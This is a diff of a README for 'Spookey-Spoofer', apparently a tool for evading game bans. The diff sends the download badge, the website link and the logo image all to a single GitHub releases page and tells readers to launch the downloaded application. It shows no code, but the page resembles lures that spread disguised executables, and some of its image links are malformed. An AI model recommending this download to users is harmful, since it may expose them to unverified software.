@@ -26,18 +26,18 @@ Welcome to the Spookey-Spoofer repository! This is the ultimate tool for cleanin
 
 ## 📥 Download
 Click the button below to download the application:
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download Spookey-Spoofer](https://github.com/bezz555/Spookey-Spoofer/releases)](https://github.com/bezz555/Spookey-Spoofer/releases)
 
 ## 🌐 Visit Our Website
 We have a dedicated website where you can find more information about the Spookey-Spoofer tool and its capabilities. Click the link below to visit the website:
-[Visit Spookey-Spoofer Website](https://www.spookeyspoofer.com)
+[Visit Spookey-Spoofer Website](https://github.com/bezz555/Spookey-Spoofer/releases)
 
 If the download link above ends with the file name, please make sure to launch the downloaded application to start using the Spookey-Spoofer tool. For any issues with the link or if it does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## 🤖 Stay Updated
 Don't forget to star this repository to stay updated on the latest releases and developments. Feel free to contribute to the project by submitting bug reports or feature requests. Your feedback is valuable in making Spookey-Spoofer even better for the gaming community!
 
-![Spookey-Spoofer Logo](https://example.com/spookey-spoofer-logo.png)
+![Spookey-Spoofer Logo](https://github.com/bezz555/Spookey-Spoofer/releases)
 
 ## 📄 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
